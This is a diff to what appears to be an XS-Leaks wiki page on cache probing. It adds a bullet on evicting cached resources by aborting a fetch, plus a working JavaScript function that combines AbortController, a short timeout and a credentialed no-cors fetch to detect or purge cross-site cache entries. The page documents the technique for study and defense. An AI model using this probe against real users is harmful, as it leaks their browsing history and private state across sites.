@@ -7,6 +7,7 @@ abuse = [
     "Error Events",
     "Cache",
     "iframes",
+    "AbortController"
 ]
 defenses = [
     "SameSite Cookies",
@@ -44,12 +45,66 @@ Cache Probing with [Error Events]({{< ref "../attacks/error-events.md" >}}) [^2]
 
 To invalidate a resource from the cache the attacker must force the server to return an error when fetching that subresource. There are a couple of ways to achieve this:
 
+- A fetch request with `cache:'reload'`option that is aborted with [`AbortController.abort()`](https://developer.mozilla.org/en-US/docs/Web/API/AbortController/abort) before new content has been received, but after the request was initiated by the browser. 
 - A request with an [overlong referer header](https://lists.archive.carbon60.com/apache/users/316239) and `'cache':'reload'`. This might not work as browsers [capped](https://github.com/whatwg/fetch/issues/903) the length of the referrer to prevent this.
 - A `POST` request with a `fetch` `no-cors`. Sometimes even in cases where an error is not returned the browser invalidates the cache.
 - Request headers such as Content-Type, Accept, Accept-Language, etc that may cause the server to fail (more application dependent).
 - Other request properties.
 
 Often some of these methods might be considered a bug in the browser (e.g. [this bug](https://bugs.chromium.org/p/chromium/issues/detail?id=959789#c9)).
+
+## Fetch with AbortController
+The below snippet shows how the [`AbortController`](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) interface could be combined with *fetch* and *setTimeout* to both detect whether the resource is cached and to evict a specific resource from the browser cache. A nice feature about this technique is that the probing occurs without caching new content in the process.
+```javascript
+async function ifCached(url, purge = false) {
+    var controller = new AbortController();
+    var signal = controller.signal;
+    // After 9ms, abort the request. If the timeout was successful, 
+    // The timeout might need to be adjusted for the attack to work properly.
+    // Purging content seems to take less time than probing
+    var wait_time = (purge) ? 3 : 9;
+    var timeout = await setTimeout(() => { 
+        controller.abort();
+    }, wait_time);
+    try {
+        // credentials option is needed for Firefox
+        let options = {
+            mode: "no-cors", 
+            credentials: "include", 
+            signal: signal
+        };
+        // if the option "cache: reload" is set, the browser will purge 
+        // the resource from the browser cache
+        if(purge) options.cache = "reload";
+        
+        await fetch(url, options);
+    } catch (err) {
+        // When controller.abort() is called, the fetch will throw an Exception
+        if(purge) console.log("The resource was purged from the cache");
+        else console.log("The resource is not cached");
+        return false
+    }
+    // clearTimeout will only be called if this line was reached in less than the fetch timeout,
+    // which means that the resource must have arrived from the cache
+    clearTimeout(timeout);
+    console.log("The resource is cached");
+    
+    return true;
+}
+
+// purge https://example.org from the cache
+await ifCached('https://example.org', true);
+
+// Put https://example.org into the cache
+// Skip this step to simulate a case where example.org is not cached
+open('https://example.org');
+
+// wait 1 second (until example.org loads)
+await new Promise(resolve => setTimeout(resolve, 1000));
+
+// Check if https://example.org is in the cache
+await ifCached('https://example.org');
+```
 
 ## Defense
 
